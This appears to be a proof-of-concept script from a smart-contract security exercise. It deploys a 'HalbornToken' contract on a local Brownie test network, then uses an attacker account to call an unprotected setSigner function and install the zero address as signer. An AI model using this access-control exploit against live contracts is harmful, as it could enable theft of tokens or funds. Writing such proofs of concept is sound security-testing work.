from brownie import HalbornToken, accounts


def main():
    zero_address = "0x0000000000000000000000000000000000000000"

    ### get the vulnerable contract's "interface"
    steve = accounts[0]
    amount_to_mint = 10000000000000000000000
    random_merkle_tree_root_hash = (
        "0x87c2d362de99f75a4f2755cdaaad2d11bf6cc65dc71356593c445535ff28f43d"
    )

    halborn = HalbornToken.deploy(
        "Halborn Token",
        "HT",
        amount_to_mint,
        steve,
        random_merkle_tree_root_hash,
        {"from": steve},
    )

    ### adding an attacker account.
    bad = accounts[8]

    ### use vulnerable setSigner function to set 'zero' (0x00) address as a signer
    halborn.setSigner(
        zero_address,
        {"from": bad},
    ).wait(1)
